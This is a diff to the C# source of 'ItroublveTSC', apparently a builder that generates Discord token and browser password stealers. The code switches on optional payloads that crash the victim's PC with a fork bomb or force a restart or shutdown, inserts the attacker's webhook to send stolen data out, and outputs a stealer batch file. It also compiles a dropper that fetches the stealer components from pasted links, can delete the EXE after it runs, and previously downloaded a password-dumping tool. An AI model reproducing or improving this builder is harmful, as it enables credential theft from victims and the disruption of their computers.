@@ -23,7 +23,7 @@ namespace ItroublveTSC
         {
             Rainbow.RainbowEffect();
             this.pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
-            this.panel37.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
+            this.PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
         }
 
         private void frmMain_Load(object sender, EventArgs e)
@@ -54,18 +54,21 @@ namespace ItroublveTSC
                 {
                     File.Copy(_TokenStealer, _CopyTokenStealer);
                     string text = File.ReadAllText("TokenStealerCOPY.bin");
-                    if (CrashPCchkbox.Checked && RestartPCchkbox.Checked)
-                    {
-                        text = text.Replace("rem %0|%0", "%0|%0");
-                        text = text.Replace("rem SHUTDOWN -r -t 5", "SHUTDOWN -r -t 5");
-                    }
-                    else if (CrashPCchkbox.Checked && !RestartPCchkbox.Checked)
+                    if (CrashPCchkbox.Checked)
                     {
                         text = text.Replace("rem %0|%0", "%0|%0");
                     }
-                    else if (!CrashPCchkbox.Checked && RestartPCchkbox.Checked)
+                    if (RestartPCchkbox.Checked)
                     {
-                        text = text.Replace("rem SHUTDOWN -r -t 5", "SHUTDOWN -r -t 5");
+                        text = text.Replace("rem SHUTDOWN -r -t 30", "SHUTDOWN -r -t 30");
+                    }
+                    if (ShutdownPCchkbox.Checked)
+                    {
+                        text = text.Replace("rem SHUTDOWN /s /t 30 /c", "SHUTDOWN /s /t 30 /c");
+                    }
+                    if (BootloopPCchckbox.Checked)
+                    {
+                        MessageBox.Show("I'm still working on this feature - Bootloop PC", "ItroublveTSC");
                     }
                     text = text.Replace("Webhook", WebHookTxt.Text);
                     File.WriteAllText("TokenStealerCopy.bin", text);
@@ -73,12 +76,6 @@ namespace ItroublveTSC
                     File.Move(_CopyTokenStealer, "output/Token Stealer.bat");
                     File.Delete(_CopyTokenStealer);
                     Stealer.Dialog(this.WebHookTxt.Text);
-                    using (WebClient webClient = new WebClient())
-                        webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer.vbs", "output/tokenstealer.vbs");
-                    using (WebClient webClient = new WebClient())
-                        webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/tokenstealer2.vbs", "output/tokenstealer2.vbs");
-                    using (WebClient webClient = new WebClient())
-                        webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView.exe?raw=true", "output/WebBrowserPassView.exe");
                     MessageBox.Show("Stealer files successfully created!", "ItroublveTSC");
                 }
                 catch (Exception ex)
@@ -112,29 +109,14 @@ namespace ItroublveTSC
         private void roundBtn1_Click(object sender, EventArgs e)
         {
             bool flag = this.FinalresbatTxt.Text == "" || this.FinalresbatTxt.Text == "Token Stealer.bat Link Here";
-            bool flag2 = this.TokenStealerVbsTxt.Text == "" || this.TokenStealerVbsTxt.Text == "Token Stealer.vbs Link Here";
-            bool flag3 = this.TokenStealer2VbsTxt.Text == "" || this.TokenStealer2VbsTxt.Text == "Token Stealer2.vbs Link Here";
             bool flag4 = this.SendhookfileTxt.Text == "" || this.SendhookfileTxt.Text == "Sendhookfile.exe Link Here";
-            bool flag5 = this.WebbrowserpassviewTxt.Text == "" || this.WebbrowserpassviewTxt.Text == "Webbrowserpassview.exe Link Here";
             if (flag)
             {
                 MessageBox.Show("You need to paste a link to Token stealer.bat here!", "ItroublveTSC");
             }
-            if (flag2)
-            {
-                MessageBox.Show("You need to paste a link to Token Stealer.vbs here!", "ItroublveTSC");
-            }
-            if (flag3)
-            {
-                MessageBox.Show("You need to paste a link to Token Stealer2.vbs here!", "ItroublveTSC");
-            }
             if (flag4)
             {
                 MessageBox.Show("You need to paste a link to Sendhookfile.exe here!", "ItroublveTSC");
-            }
-            if (flag5)
-            {
-                MessageBox.Show("You need to paste a link to Webbrowserpassview.exe here!", "ItroublveTSC");
             }
             else
             {
@@ -147,13 +129,14 @@ namespace ItroublveTSC
                     startCopydir.Arguments = @"bin bin_copy /Y /E /I";
                     copydir.StartInfo = startCopydir;
                     copydir.Start();
-                    System.Threading.Thread.Sleep(2000);
+                    Thread.Sleep(2000);
                     string text = File.ReadAllText(@"bin_copy/Program.cs");
                     text = text.Replace("finalresbatch", FinalresbatTxt.Text);
-                    text = text.Replace("finalresvbs", TokenStealerVbsTxt.Text);
-                    text = text.Replace("finalresVbs2", TokenStealer2VbsTxt.Text);
                     text = text.Replace("sendhookfile", SendhookfileTxt.Text);
-                    text = text.Replace("webbrowserpassview", WebbrowserpassviewTxt.Text);
+                    if (AutoRmvExe.Checked)
+                    {
+                        text = text.Replace("//RemoveEXE", "RemoveEXE");
+                    }
                     File.WriteAllText(@"bin_copy/Program.cs", text);
 
                     Process.Start(new ProcessStartInfo()
